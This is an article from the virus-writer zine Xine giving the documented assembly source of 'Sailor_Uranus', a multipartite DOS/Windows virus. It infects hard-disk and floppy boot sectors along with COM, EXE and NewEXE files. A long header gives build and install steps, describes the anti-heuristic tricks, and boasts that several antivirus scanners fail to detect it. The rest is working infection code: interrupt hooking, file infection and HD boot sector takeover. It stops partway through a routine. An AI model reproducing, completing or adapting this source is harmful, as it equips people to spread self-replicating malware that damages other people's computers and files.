   ;                                        /-----------------------------\
   ;                                        | Xine - issue #2 - Phile 026 |
   ;                                        \-----------------------------/


   ;******************************************************************************
   ;
   ; Virus name    : Sailor_Uranus
   ; Author        : b0z0
   ; Group         : iKx
   ; Origin        : Padania, December 1996 / January 1997
   ; Compiling     : Use TASM 3.00
   ;                 TASM /ZI /M2 URA.ASM
   ;                 TLINK /M /V URA
   ;                 TDSTRIP -C URA.EXE
   ;                 Then put the first 512 bytes into a floppy boot sector
   ;                 and the rest to the floppy boot starting at 79,1,13.
   ;                 Remember also to put the original boot sector to 79,1,12
   ; Targets       : HD Boot Sector / FD Boot Sector / COM / EXE / NewEXE
   ;                 Infected COMs:
   ;                                       All COMs that are smaller than
   ;                                       62463 and bigger than 1280 will
   ;                                       be infected. Some antiviruses and
   ;                                       special files won't be infected
   ;                                       (in all three cases). Check the
   ;                                       source code for more about these
   ;                                       files.
   ;                 Infected EXEs:
   ;                                       All EXEs without overlays and
   ;                                       bigger than 5000 will be infected.
   ;                                       This lenght check is also valid
   ;                                       for NewEXEs.
   ;                 Infected NewEXEs:
   ;                                       .CPL (control panel files)
   ;                                       .DLL (dynamic link libs)
   ;                                       .DRV (drivers)
   ;                                       .EXE (just normal NewEXEs :-) )
   ;                                       .FON (fonts)
   ;                                       .FOT (other fonts... they are quite
   ;                                             newer infected.. they are all
   ;                                             skipped at the lenght test)
   ;                                       .SCR (screen savers)
   ;                                       The NewEXE infection is done using
   ;                                       the VLAD-method (thanx Qark and
   ;                                       QuantumG). There has been added some
   ;                                       more check and modifies so now all
   ;                                       infected NewEXEs will work correctly.
   ;                 Infected Floppy Boots:
   ;                                       Only 1.44mb floppyes will be infected.
   ;                                       The virus won't infect floppies that
   ;                                       have a 'PK' as the label start. This
   ;                                       is done to try to prevent damaging at
   ;                                       least PKZIP multidisk archives.
   ;                 Infected HD boot:
   ;                                       The boot sector of the first active
   ;                                       partition will be infected. The active
   ;                                       partition will be determined by a check
   ;                                       in the partition table. Generally the
   ;                                       DOS bootable partition is also set as
   ;                                       active.
   ; Hooked ints   : 13h and 21h
   ;                 13h is hooked for floppy boot infections (AH = 02h)
   ;                 21h hooked functions:
   ;                       4b00h   = Load and Execute
   ;                       4eh     = Findfirst
   ;                       4fh     = Findnext
   ; Size          : Sailor_Uranus fits exactly (well, considering also the
   ;                 place for BPB data and 2 unused bytes :)) 4 floppy disk
   ;                 sectors (boot + 3 at the end of the floppy). Infected
   ;                 files (all kinds) will grow then 2048 bytes.
   ; Notes         : Sailor_Uranus can go resident just if started from an
   ;                 infected boot. So any infected file will check if the
   ;                 virus is resident and if it isn't it will infect the
   ;                 HD boot. The virus infects the HD boot in two ways:
   ;                       - Using int 13h, if it is runned from and infected
   ;                         COM or EXE.
   ;                       - Using the IOCTL int 21h functions (440dh) if it
   ;                         is runned from a NewEXE
   ;                 This has been done because of course you can't directly
   ;                 use the int 13h calls while you are in protected mode,
   ;                 simply because selectors would be threated by the int 13h
   ;                 as a segment and this, as you may imagine, won't work
   ;                 very well :-) So using IOCTL we will give him our selectors
   ;                 and Win will do the whole work of convertion and so on for
   ;                 us. On the other side the IOCTL functions may be also used
   ;                 from the DOS, so why two ways of infections? The response
   ;                 is simple: IOCTL functions doesn't work with DBLSPACE and
   ;                 such programs, which are quite used around :( So i added
   ;                 also a second more standard int 13h way to infect.
   ;                  Sailor_Uranus have also 2 ways to hook int 21h. The first
   ;                 is the classic way to wait for 5 EXEs to be executed and
   ;                 checking the buffer for a 'MZ' at int 13h. The second is
   ;                 an "infected activation routine", this means that when an
   ;                 infected file is runned (this is only for DOS files) it
   ;                 will automatically trigger to the int 13h a check if the
   ;                 int 21h is already set. So the 'residency check' of the
   ;                 int 13h is also used to set int 21h. Maybe you are now
   ;                 thinking why i do this. Well, simple. On some DOS 6.22 with
   ;                 SMARTDRV and DRVSPACE loaded and a couple of other Windoze
   ;                 stuff int 13h 'MZ' check doesn't work.So on DOS 6.22 without
   ;                 the infected activation the virus may never hook int 21h.
   ;                  Residency: well, Sailor_Uranus doesn't hook interrupts
   ;                 under Windows. As you know Windows doesn't pass AH=4bh
   ;                 calls to the real mode interrupt (the DOS one). But it
   ;                 will pass usually all the 4Eh/4Fh calls, so under Win this
   ;                 virus will be able to infect files when they are searched
   ;                 (for example FileManager uses 4Eh/4Fh, so when the user will
   ;                 browse his dirs files will be infected). Now you may ask
   ;                 yourself why i said "will pass usually", why "usually"?
   ;                 Well, Win will pass these functions to the real mode
   ;                 int 21h only if the 32-bit access (32BFA) is disabled.
   ;                 But, hey! 32-bit access is disabled by default and also
   ;                 Microsuck doesn't encurage the users to use it. So, be
   ;                 sure, that more than the 95% of users has 32BFA turned off!
   ;                  About the various NewEXEs files that are infected.
   ;                 Obvisiously i am not pretending that FOTs or CPLs will
   ;                 carry the virus around :-) Basically i decided to infect
   ;                 them to mantain the virus on a system. Mainly anything
   ;                 that is Windows releated will be infected ;-) On the other
   ;                 side some of the strange infected files may be also
   ;                 considered as couriers. DRVs for example are very usual
   ;                 on various card vendor's disks. Also some screensavers
   ;                 may be distribuited around by ppl. Also VBX infection
   ;                 works ok, but many VBXs i tried to infect noticed the
   ;                 user that they have been changed, so i decided not to
   ;                 infect at all VBXs.
   ;                  To prevent an enormous loss of time files on floppy disk
   ;                 aren't infected.
   ;                  Sailor_Uranus uses the 18_Tech (refeer to Dandler's
   ;                 article for more information about this), so wind0ze
   ;                 (when 32 BDA is enabled) and some avs won't worry
   ;                 about our int 13h handler ;)
   ; AV, speak!    : What does various AV says
   ;                       TBScan 7.06:
   ;                                       COM    - No Flags!
   ;                                       EXE    - K flag often
   ;                                       NewEXE :
   ;                                           .EXE   - only B flag quite always
   ;                                           others - No scan at all :-)
   ;                                       Boot   - No Flags!
   ;                       AVPlite 3.0 (updated bases):
   ;                                       EXE - *sometime* Typo_COMTsr susp.
   ;                                       COM - *sometime* Typo_COMTsr susp.
   ;                               All NewExes - Nothing!
   ;                                      Boot - Nothing!
   ;                       FProt 2.25:
   ;                               - Normal scan
   ;                                       Nothing in any case.
   ;                               - /analyse
   ;                                       Will give a warning only on some COMs
   ;                               - /analyse /paranoid
   ;                                       Will give a warning only on some COMs
   ;                 Well, the results of other AVs (Scan, NAV and so on) are
   ;                 all the same... i'll let you imagine :-)))
   ; Name origin   : Sailor_Uranus is dedicated to Sailor Uranus, one of the
   ;                 Pretty Sailor Soldiers family.
   ; For more info : Of course, if you aren't satisfacted with my description
   ;                 and you don't have time to check out the code get VSUM
   ;                 (the year 2000 one, November edition) and read more
   ;                 interesting things about Sailor_Uranus 8-)
   ; Greetings     : Of course a great thanx to Qark and QuantumG for writing
   ;                 the NewEXE infection tuorial and NE infectors.
   ;                 Thanx to Dandler for the very nice Int 18h trick infos!
   ;                 Thanx also to Darkman for the 4Eh/4Fh tutorial. You saved
   ;                 me a little of time ;)
   ; Registration  : hehe :-) if you liked this virus just send me a line...
   ;
   ;******************************************************************************


   .286
   .model tiny
   .code
           org 0

   virus_lenght    equ     (offset virus_end - offset virus_start)

   virus_start:
                   jmp     short boot_start
                   nop

                   org     3eh

   boot_start:
                   cli
                   xor     ax,ax
                   mov     ss,ax                   ; set SS:SP to 0000:7C00
                   mov     ax,7c00h
                   mov     sp,ax
                   push    ss
                   pop     ds
                   sti

                   mov     si,412h
                   inc     si
                   mov     ax,word ptr ds:[si]     ; ax = avaiable mem
                   sub     ax,3                    ; 3 kb 'o' mem
                   mov     word ptr ds:[si],ax

                   mov     cl,06h
                   shl     ax,cl
                   mov     es,ax                   ; ES segment for our virus

                   cld
                   mov     di,200h                 ; copy 200h virus bytes
                   push    di                      ; in memory
                   pop     cx
                   sub     di,di
                   mov     bx,cx
                   mov     si,7c00h
                   rep     movsb

                   mov     ax,203h                 ; read the body of the virus
                   mov     cl,3                    ; on hd at 0,0,3
                   sub     dh,dh
                   cmp     byte ptr ds:[fromfloppy + 7c00h],00h
                   jne     load_from_hd            ; or on floppy at
                   mov     cx,4f0dh                ; cylinder 79, sector 0dh
                   inc     dh                      ; side 1

   load_from_hd:
                   int     13h

                   mov     byte ptr es:[int21set],05h      ; int 21h set flag

                   mov     si,04ch                 ; on 13h IVT entry

                   mov     ax,word ptr ds:[si+2]   ; save old int 13h
                   mov     word ptr es:[seg13h],ax

                   mov     ax,word ptr ds:[si]     ; off:seg
                   mov     word ptr es:[off13h],ax

                   push    ds

                   mov     ax,0f000h               ; point to rom
                   mov     ds,ax
                   xor     bx,bx
   cd18loop:
                   inc     bx
                   cmp     word ptr ds:[bx],18cdh  ; search for the int 18h
                   jne     cd18loop

                   pop     ds

                   mov     word ptr ds:[si],bx     ; point int13h to the cd18h
                   mov     word ptr ds:[si + 2],ax

                   mov     word ptr ds:[si + 14h],offset new_int13h
                   mov     word ptr ds:[si + 16h],es       ; set int 18h

                   push    ds                      ; es=ds=00
                   pop     es

                   mov     ax,201h                 ; load the original bs
                   mov     bx,7c00h
                   mov     cx,2                    ; 0,0,2 on hd
                   sub     dh,dh
                   cmp     byte ptr ds:[fromfloppy + 7c00h],00h
                   jne     load_bs_from_hd
                   mov     cx,4f0ch                ; or here on floppy
                   inc     dh

   load_bs_from_hd:
                   mov     word ptr cs:[7c00h-2],13cdh
                   jmp     virus_start-2           ; pass to original bs

   fromfloppy      db      00h                     ; 00h = floppy, 01h = hd

   new_int13h:
                   add     sp,6                    ; correct stack

                   xchg    al,ah                   ; antiheuristic
                   cmp     ax,2301h                ; installation check
                   jne     no_inst_check
                   cmp     bl,0b0h                 ; from a dos executable?
                   jne     alr_21handler
                   push    ax                      ; yea, so try to force
                   push    ds                      ; loading of int21 handler
                   call    force_int21h_set
                   pop     ds
                   pop     ax
   alr_21handler:
                   iret

   no_inst_check:
                   cmp     al,02h                  ; read
                   xchg    al,ah                   ; reput right stuff in AX
                   je      check_floppy

                    db      0EAh                   ; old int 13h
   off13h           dw      ?
   seg13h           dw      ?

   check_int21h:
                   cmp     byte ptr es:[bx],'M'    ; longer but antiheuristic
                   jne     end_21_check

                   cmp     byte ptr es:[bx+1],'Z'
                   jne     end_21_check

   force_int21h_set:
                   cmp     byte ptr cs:[int21set],00h      ; 21 already set?
                   je      end_21_check

                   dec     byte ptr cs:[int21set]          ; decrease counter

                   cmp     byte ptr cs:[int21set],00h      ; time to hook?
                   jne     end_21_check

                   xor     ax,ax
                   mov     ds,ax                           ; ds to ivt

                   push    cs
                   pop     ax

                   xchg    word ptr ds:[086h],ax           ; set our int 21h
                   mov     word ptr cs:[seg21h],ax
                   mov     ax,offset new_int21h
                   xchg    word ptr ds:[084h],ax
                   mov     word ptr cs:[off21h],ax

   end_21_check:
                   ret

   check_floppy:
                   pushf
                   call    dword ptr cs:off13h             ; read it
                   jnc     floppy_ok
                   jmp     error                           ; exit on error
   floppy_ok:

                   pushf
                   pusha
                   push    ds

                   cmp     cx,01h
                   je      no_check_int21h

                   call    check_int21h                    ; check for int 21h
                   jmp     leave_13h                       ; installation

   no_check_int21h:

                   cmp     dh,00h
                   jne     leave_13h

                   cmp     dl,1
                   ja      leave_13h

                   cmp     word ptr es:[bx+13h],2880       ; only 1.44mb
                   jne     leave_13h

                   cmp     word ptr es:[bx+2bh],'KP'       ; label PKBACK...?
                   je      leave_13h                       ; if so, leave

   boot_check:
                   cmp     word ptr es:[bx+boot_check+5],'US'
                   je      leave_13h                       ; already inf?

                   push    es

                   mov     ax,201h
                   inc     ah
                   push    ax
                   mov     cx,4f0ch        ; cyl 79, sec 0ch
                   mov     dh,1
                   int     13h             ; save original boot
                   jnc     ok_write
                   pop     ax
                   pop     es
                   jmp     leave_13h       ; write protected, go away

   ok_write:
                   push    es
                   pop     ds
                   push    cs
                   pop     es

                   sub     bp,bp           ; copy boot data
                   call    copy_boot_data

                   mov     byte ptr cs:[fromfloppy],dh

                   pop     ax
                   push    bx
                   push    ax
                   sub     bx,bx           ; put new boot
                   int     13h

                   pop     ax              ; ax=301h
                   inc     al              ; 3 sectors to write
                   inc     al
                   mov     bx,200h         ; body of the virus
                   mov     cx,4f0dh        ; d,e and f
                   mov     dh,01h
                   int     13h
                   pop     bx
                   pop     es

   leave_13h:
                   pop     ds
                   popa
                   popf
   error:
                   retf    2



   infect_hd_by_13h:

                   mov     ax,0201h
                   push    ax
                   lea     bx,[offset filebuffer+bp]
                   mov     dx,80h
                   mov     cx,1
                   int     13h             ; read mbr to our buffer

                   call    table_check     ; check partition table
                   pop     ax
                   jc      inf_hd_err      ; carry if error while looking at
                                           ; the partition table
                   int     13h             ; read boot sector

                   cmp     word ptr [bx+boot_check+5],'US'   ; already infected?
                   je      inf_hd_err

                   push    dx
                   push    cx

                   call    copy_boot_data  ; copy needed data from bs

                   inc     cx

                   mov     ax,201h         ; save original boot
                   inc     ah
                   push    ax
                   int     13h

                   pop     ax              ; save virus body
                   inc     al
                   inc     al
                   mov     bx,200h
                   add     bx,bp
                   inc     cx
                   int     13h

                   pop     cx
                   pop     dx
                   mov     byte ptr ds:[fromfloppy+bp],1   ; hd marker
                   mov     bx,bp           ; put virus boot
                   mov     ax,201h
                   inc     ah
                   int     13h

   inf_hd_err:
                   ret

   boot_end:

                   org     01feh
   boot_markers:
                   db      055h,0aah

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

   second_part_start:

   new_int21h:                                     ; our int 21h handler
                   cmp     ah,4eh
                   je      findfirst

                   cmp     ah,4fh
                   je      findnext

                   push    ax                      ; fool heuristics
                   xchg    al,ah
                   cmp     ax,004bh
                   pop     ax
                   jne     do_int21h
                   jmp     execution

   do_int21h:
            db      0EAh                           ; original int 21h
   off21h   dw      ?
   seg21h   dw      ?

   findfirst:
                   pusha
                   push    es

                   cld
                   lea     di,filename
                   mov     si,dx
                   push    cs
                   pop     es
                   mov     word ptr cs:[di-4],di   ; offset of filename
                   in      ax,40h
                   xor     al,ah
                   and     al,0111b
                   mov     byte ptr cs:[di-5],al   ; infection counter
   getpath:
                   lodsb                           ; save search path
                   cmp     al,00h
                   je      pathexit
                   stosb                           ; es:di = filename
                   cmp     al,':'
                   je      ok_sepa
                   cmp     al,'\'
                   jne     getpath
   ok_sepa:
                   mov     word ptr cs:[filenameoff],di
                   jmp     getpath
   pathexit:
                   pop     es                      ; restore regs
                   popa
   findnext:
                   pushf
                   call    dword ptr cs:off21h

                   pusha
                   push    ds
                   push    es
                   pushf

                   cmp     byte ptr cs:[tmpcounter],07h
                   jae     time_to_infect
                   inc     byte ptr cs:[tmpcounter]
                   jmp     go_away
   time_to_infect:

                   cld

                   mov     ah,2fh                        ; get DTA
                   int     21h

                   mov     di,cs:[filenameoff]
                   mov     si,bx
                   add     si,1eh                        ; filename
                   push    es
                   pop     ds
                   push    cs
                   pop     es
   getfname:
                   lodsb
                   stosb
                   cmp     al,'.'
                   jne     isntadot
                   mov     word ptr cs:[filedotoff],di   ; save dot position
   isntadot:
                   or      al,al               ; end of filename?
                   jne     getfname

                   push    cs
                   pop     ds

                   mov     dx,offset filename
                   mov     di,[filedotoff]
                   mov     byte ptr ds:[tmpcounter],00h
   founded_dot:
                   cmp     word ptr ds:[di],'OC'   ; .com
                   je      ok_inf
                   mov     byte ptr ds:[tmpcounter],01h
                   cmp     word ptr ds:[di],'XE'   ; .exe
                   je      ok_inf
                   cmp     word ptr ds:[di],'LD'   ; .dll
                   je      ok_inf
                   cmp     word ptr ds:[di],'OF'   ; .fon and .fot
                   je      ok_inf
                   cmp     word ptr ds:[di],'RD'   ; .drv
                   je      ok_inf
                   cmp     word ptr ds:[di],'CS'   ; .scr
                   je      ok_inf
   ;                cmp     word ptr ds:[di],'BV'   ; .vbx is too risky
   ;                je      ok_inf
                   cmp     word ptr ds:[di],'PC'   ; .cpl
                   jne     go_away
   ok_inf:
                   call    infect_it

   go_away:
                   popf
                   pop     es
                   pop     ds
                   popa

                   retf    2

   execution:
                   pushf
                   pusha
                   push    ds
                   push    es
                   mov     byte ptr cs:[tmpcounter],0b0h   ; exec marker
   infect_it:
                   mov     ah,19h          ; get current default drive
                   int     21h
                   cmp     al,2
                   jae     ok_drive        ; don't infect on floppyes
                   jmp     exit_at_all

   ok_drive:
                   push    ds
           push    dx
                   push    cs
                   pop     ds

                   mov     ax,3524h          ; get int24h seg and off
           int     21h
                   mov     word ptr ds:[old_int24_off],bx  ;store them
                   mov     word ptr ds:[old_int24_seg],es

                   mov     dx,offset int24h         ; set our int24h
           mov     ax,2524h
           int     21h
                   pop     dx
                   pop     ds

   check_name:
                   push    dx
                   pop     di

   check_name_loop:
                   cmp     byte ptr ds:[di],'.'    ; search dot
                   je      got_namedot
                   cmp     byte ptr ds:[di],00h    ; end of filename?
                   jne     cn_int_loop
                   jmp     end_infection
   cn_int_loop:
                   inc     di
                   jmp     check_name_loop
   got_namedot:
                   cmp     byte ptr ds:[di+4],00h  ; is the extension dot?
                   jne     cn_int_loop
                   lea     si,dontinfect           ; point on noninfectables
   check_av_loop:
                   mov     cx,word ptr cs:[si]
                   cmp     word ptr ds:[di-2],cx   ; look each file
                   jne     next_av
                   jmp     end_infection
   next_av:
                   inc     si
                   inc     si
                   cmp     byte ptr cs:[si],00h    ; end of the list?
                   je      end_check
                   jmp     check_av_loop
   end_check:

                   mov     ax,4300h
                   int     21h             ; Get attributes


                   mov     word ptr cs:[file_att],cx
                   sub     cx,cx           ; clear attributes
                   call    set_attributes
                   jc      end_infection   ; exit on error

                   push    ds              ; save ds:dx to filename on stack
                   push    dx

                   mov     ax,3d02h        ; open in rw mode
                   int     21h
                   jc      end_infection_wfa

                   mov     bx,ax           ; handle in bx
                   push    cs
                   pop     ds

                   mov     ax,5700h        ; get time/date
                   int     21h
                   push    dx
                   push    cx

                   mov     ah,3fh          ; read a bounch of bytes
                   mov     cx,41h
                   lea     dx,filebuffer   ; to our buffer
                   mov     si,dx
                   int     21h

                   cmp     byte ptr ds:[si],'M'            ; exe?
                   jne     isnotanexe
                   cmp     byte ptr ds:[si+1],'Z'          ; really exe?
                   jne     isnotanexe
                   cmp     word ptr ds:[si+12h],'US'       ; exe marker?
                   je      close_and_finish
                   cmp     byte ptr ds:[si+1ah],ch         ; no overlays?
                   jne     close_and_finish

                   mov     al,02h          ; get lenght of the file
                   call    seekfile

                   or      dx,dx           ; ok if > 64k
                   jnz     oklenght

                   cmp     ax,800h
                   jbe     close_and_finish        ; not ok if < 5000

   oklenght:
                   cmp     byte ptr ds:[si+18h],'@'        ; winexe?
                   je      infect_winexe
                   call    infect_exe
                   jmp     close_and_finish
   isnotanexe:
                   cmp     byte ptr ds:[tmpcounter],01h    ; Prevent ruining
                   je      close_and_finish                ; files

                                   ; Infact we may have founded a file from
                                   ; another program that have the same
                                   ; extension as a windows part but of
                                   ; course it isn't a NewEXE. For example
                                   ; i saw some programs that have their
                                   ; files named as xxx.DRV and we don't
                                   ; want to destroy them :-)

                   cmp     byte ptr [si],0e9h              ; jmp?
                   jne     comtest
                   cmp     byte ptr [si+3],'S'
                   je      close_and_finish
   comtest:
                   call    infect_com

   close_and_finish:
                   pop     cx
                   pop     dx
                   mov     ax,0157h        ; restore time/date
                   xchg    al,ah
                   int     21h

                   mov     ah,3eh          ; close file
                   int     21h

   end_infection_wfa:
                   pop     dx              ; ds:dx pointer to filename
                   pop     ds
                   mov     cx,word ptr cs:[file_att]       ; attributes
                   jc      end_infection
                   call    set_attributes  ; put original attributes

   end_infection:

                   mov     ax,2524h
                   mov     ds,cs:[old_int24_seg]
                   mov     dx,cs:[old_int24_off]
                   int     21h                     ; restore int24h
   exit_at_all:

                   cmp     byte ptr cs:[tmpcounter],0b0h   ; was executing?
                   je      real_end
                   ret
   real_end:
                   mov     byte ptr cs:[tmpcounter],00h
                   pop     es
                   pop     ds
                   popa
                   popf
                   jmp     do_int21h

   infect_winexe:
                   mov     di,offset winexe_data

                   mov     ax,word ptr [si+3ch]      ; nexe header offset
                   mov     word ptr ds:[di],ax

                   mov     word ptr ds:[si+12h],'US' ; infection marker

                   sub     word ptr ds:[si+3ch],8    ; enought room?
                   cmp     word ptr ds:[si+3eh],0
                   jne     close_and_finish

                   sub     al,al           ; seek to start
                   call    seekfile

                   mov     ah,40h          ; rewrite header
                   mov     cl,ah
                   xor     ch,ch
                   mov     dx,si
                   int     21h

                   jc      close_and_finish        ; exit on error

                   sub     al,al
                   mov     dx,word ptr ds:[di]     ; to newexe header
                   call    seekfile_mid_cx

                   mov     ah,3fh                  ; read NE header
                   mov     cx,512
                   mov     dx,si
                   int     21h

                   cmp     word ptr ds:[si+36h],0802h  ; only Win NewEXEs
                   jne     bad_nexe                    ; with gangload area

                   cmp     word ptr ds:[si],'EN'   ; don't infect LE/PE
                   je      ok_newexe

   bad_nexe:
                   sub     al,al                   ; start of file
                   call    seekfile

                   mov     ah,3fh                  ; reread exe hdr
                   mov     cx,41h
                   mov     dx,si
                   int     21h

                   add     word ptr ds:[si+3ch],8  ; restore changed data

                   sub     al,al                   ; start of file
                   call    seekfile
                                                   ; leave the marker
                   mov     ah,40h                  ; so we wouldn't waste
                   mov     cl,ah                   ; time once again
                   xor     ch,ch
                   mov     dx,si
                   int     21h                     ; write header

                   jmp     close_and_finish

   ok_newexe:
                   mov     dx,8                    ; change the segment table
                   mov     ax,word ptr ds:[si+22h]
                   cmp     word ptr ds:[si+4],ax
                   jb      no_firsta
                   add     word ptr ds:[si+4],dx

   no_firsta:
                   mov     cx,4
                   push    si
                   add     si,24h
   pnt_check:
                   cmp     word ptr ds:[si],ax    ; change where needed
                   jb      no_8_add
                   add     word ptr ds:[si],dx
   no_8_add:
                   inc     si
                   inc     si
                   loop    pnt_check
                   pop     si

                   mov     ax,word ptr [si+1ch]
                   inc     word ptr [si+1ch]
                   mov     cx,dx
                   sub     dx,dx
                   mov     byte ptr ds:[si+37h],dl
                   mov     word ptr ds:[si+38h],dx ; kill gangload area
                   mov     word ptr ds:[si+3ah],dx ; so all NewEXEs will work
                   mul     cx

                   mov     cx,512
                   add     ax,word ptr ds:[si+22h]
                   adc     dx,0

                   div     cx

                   mov     word ptr ds:[di+3h],ax          ; NE size
                   mov     word ptr ds:[di+5h],dx

                   mov     ax,offset winexe_entry
                   xchg    ax,word ptr ds:[si+14h]         ; put new ip and
                   mov     word ptr ds:[di-02h],ax         ; store old ip

                   mov     ax,word ptr ds:[si+1ch]
                   xchg    ax,word ptr ds:[si+16h]         ; put new cs and
                   mov     word ptr ds:[di-04h],ax         ; store old cs

                   mov     al,byte ptr ds:[si+32h]         ; segment align
                   mov     byte ptr ds:[di+2h],al

                   mov     ax,word ptr ds:[di]             ; newexe offset
                   mov     word ptr ds:[di+7h],ax

   move_header_fwd:
                   mov     ax,word ptr ds:[di+3h]          ; ne header size
                   or      ax,ax
                   jz      last_page

                   dec     word ptr ds:[di+3h]

                   sub     al,al
                   mov     dx,word ptr ds:[di+7h]          ; where to go
                   sub     dx,8
                   call    seekfile_mid_cx

                   mov     ah,40h                          ; write
                   mov     cx,512
                   add     word ptr ds:[di+7h],cx
                   mov     dx,si
                   int     21h

                   sub     al,al
                   push    cx
                   mov     dx,word ptr ds:[di+7h]          ; to next chunk
                   call    seekfile_mid_cx

                   mov     ah,3fh                          ; read it
                   mov     dx,si
                   pop     cx
                   int     21h

                   jmp     move_header_fwd

   last_page:
                   mov     al,02h
                   call    seekfile

                   mov     cl,byte ptr ds:[di+2h]          ; segment align
                   push    bx
                   mov     bx,1
                   shl     bx,cl                   ; shift segment offset
                   mov     cx,bx                   ; by segment align
                   pop     bx
                   div     cx

                   mov     word ptr ds:[di+9h],0
                   or      dx,dx
                   jz      no_extra
                   sub     cx,dx
                   mov     word ptr ds:[di+9h],cx
                   inc     ax
   no_extra:
                   push    di
                   mov     di,si
                   add     di,word ptr ds:[last_ne]

                   mov     word ptr [di],ax                ; segment offset
                   mov     word ptr [di+2],virus_lenght
                   mov     word ptr [di+4],180h            ; Segment attributes
                   mov     word ptr [di+6],virus_lenght + 1024
                   pop     di

                   sub     al,al
                   mov     dx,word ptr ds:[di+7h]          ; where to go
                   sub     dx,8
                   call    seekfile_mid_cx

                   mov     ah,40h
                   mov     cx,word ptr ds:[di+5h]          ; write last chunk
                   add     cx,8
                   mov     dx,si
                   int     21h

                   sub     cx,cx

                   xchg    word ptr ds:[winip],cx
                   push    cx
                   sub     cx,cx                           ; reset reloc pointer
                   dec     cx
                   xchg    word ptr ds:[wincs],cx
                   push    cx

                   mov     al,02h
                   mov     dx,word ptr ds:[di+9h]          ; end of file
                   call    seekfile_mid_cx

                   mov     ah,40h                          ; write virus body
                   mov     cx,virus_lenght
                   sub     dx,dx
                   int     21h

                   pop     word ptr ds:[wincs]             ; restore reloc
                   pop     word ptr ds:[winip]             ; pointer

                   mov     ah,40h                          ; write reloc item
                   mov     dx,offset relocitem
                   mov     cx,(offset relocitem_end-offset relocitem)
                   int     21h

                   jmp     close_and_finish

   infect_exe:
                   mov     al,02h
                   call    seekfile        ; AX:DX = lenght

                   push    ax              ; check _really_ no overlays
                   push    dx
                   mov     cx,word ptr [si+04h]
                   mov     ax,512                  ; compare lenght calculated
                   mul     cx                      ; from header with the real
                   add     ax,word ptr [si+02h]    ; lenght we got from lseek
                   adc     dx,00h
                   mov     word ptr [si-02h],dx
                   mov     word ptr [si-04h],ax
                   pop     dx
                   pop     ax
                   cmp     dx,word ptr [si-02h]
                   ja      exit_exe_infection
                   cmp     ax,word ptr [si-04h]
                   ja      exit_exe_infection

                   push    ax
                   push    dx

                   mov     cx,10h                          ; calculate new
                   div     cx                              ; cs:ip for exe

                   sub     ax,word ptr [si+8h]

                   add     dx,offset exe_entry

                   push    ax
                   xchg    word ptr [si+16h],ax            ; new CS
                   mov     word ptr ds:[victim_cs],ax
                   pop     ax

                   push    dx
                   xchg    word ptr [si+14h],dx            ; new IP
                   mov     word ptr ds:[victim_ip],dx
                   pop     dx

                   add     dx,(offset virus_end + 800)     ; SP after us
                   and     dl,0feh

                   xchg    word ptr [si+0eh],ax            ; new SS
                   mov     word ptr ds:[victim_ss],ax

                   xchg    word ptr [si+10h],dx            ; new SP
                   mov     word ptr ds:[victim_sp],dx

                   pop     dx                              ; pop length
                   pop     ax

                   add     ax,virus_lenght
                   adc     dx,00h
                   mov     cx,512
                   div     cx
                   inc     ax
                   mov     word ptr [si+04h],ax       ; new nr of pages
                   mov     word ptr [si+02h],dx       ; new image mod 512
                   mov     word ptr [si+12h],'US'     ; infection marker
                   mov     byte ptr [exeorcom],00h    ; exe marker

                   sub     dx,dx
                   mov     ah,40h
                   mov     cx,virus_lenght         ; write virus body
                   int     21h

                   mov     cx,1ch
                   push    cx

                   sub     al,al
                   call    seekfile                ; go to start

                   mov     ah,40h                  ; write header
                   pop     cx
                   mov     dx,si
                   int     21h

   exit_exe_infection:
                   ret

   infect_com:
                   push    ds
                   pop     es
                   lea     di,orig_bytes           ; save first 4 bytes
                   movsw
                   movsw

                   mov     al,02h                  ; end of file
                   call    seekfile

                   cmp     ah,0f3h                 ; not bigger than...
                   ja      infect_com_exit

                   cmp     ah,04h                  ; not smaller than...
                   jbe     infect_com_exit

                   sub     ax,03h
                   add     ax,offset exe_entry     ; calculate jump
                   mov     word ptr com_jump + 01h, ax

                   mov     byte ptr [exeorcom],01h ; com marker

                   mov     ah,40h
                   sub     dx,dx
                   mov     cx,virus_lenght         ; write virus body
                   int     21h

                   mov     cx,04h
                   push    cx

                   sub     al,al
                   call    seekfile                ; start of the file

                   mov     ah,40h                  ; write new jump
                   pop     cx
                   mov     dx,offset com_jump
                   int     21h
   infect_com_exit:

                   ret

   seekfile:                                   ; move around the file
                   sub     ah,ah               ; so cwd will work
                   cwd
   seekfile_mid_cx:
                   sub     cx,cx
   seekfile_mid:
                   mov     ah,42h
                   int     21h
                   ret

   exe_entry:                                      ; EXE and COM entry point
                   call    deltaoffset
   deltaoffset:
                   push    ds
                   push    es
                   mov     bp,sp
                   mov     bx,[bp+4]
                   mov     bp,bx
                   sub     bp,offset deltaoffset   ; delta offset

                   mov     bl,0b0h
                   mov     ax,0123h                ; residency check
                   int     13h
                   cmp     ax,2301h
                   je      already_in_mem

                   push    cs
                   pop     es
                   push    cs
                   pop     ds
                   call    infect_hd_by_13h        ; infect hd by int 13h

   already_in_mem:
                   pop     es
                   pop     ds
                   pop     ax

                   cmp     byte ptr cs:[exeorcom + bp],01h
                   je      com_exit                ; exe or com finish

                   mov     ax,es                   ; calculate cs and ss
                   add     ax,10h
                   add     cs:[victim_cs + bp],ax

                   cli
                   mov     sp,word ptr cs:[victim_sp + bp]
                   add     ax,word ptr cs:[victim_ss + bp]
                   mov     ss,ax
                   sti

                   sub     ax,ax                   ; zero regs
                   sub     bx,bx
                   sub     cx,cx
                   sub     dx,dx
                   sub     di,di
                   sub     si,si
                   push    cs:[victim_cs+bp]       ; push old cs:ip
                   push    cs:[victim_ip+bp]
                   sub     bp,bp

                   retf                            ; return to old cs:ip

   victim_ip       dw      00000h
   victim_cs       dw      0fff0h
   victim_sp       dw      00000h
   victim_ss       dw      00000h
   orig_bytes      db      00h,00h,00h,00h         ; original com bytes
   com_jump        db      0e9h,00h,00h            ; space for our com jump
                                                   ; the S will be also of
                                                   ; use for infection check
   virus_name      db      'Sailor_Uranus'

   exeorcom        db      00h                     ; 01 = COM, 00 = EXE

   com_exit:
                   mov     di,0ffh
                   lea     si,[orig_bytes + bp]
                   inc     di
                   push    di
                   pop     ax
                   movsw                   ; restore 4 com bytes
                   movsw
                   jmp     ax              ; jump to cs:100

   winexe_entry:                           ; Entry point for NExes
                   pusha
                   push    es
                   push    ds

                   sub     bx,bx
                   mov     ax,0123h        ; residency check
                   int     13h
                   cmp     ax,2301h
                   je      already_inf

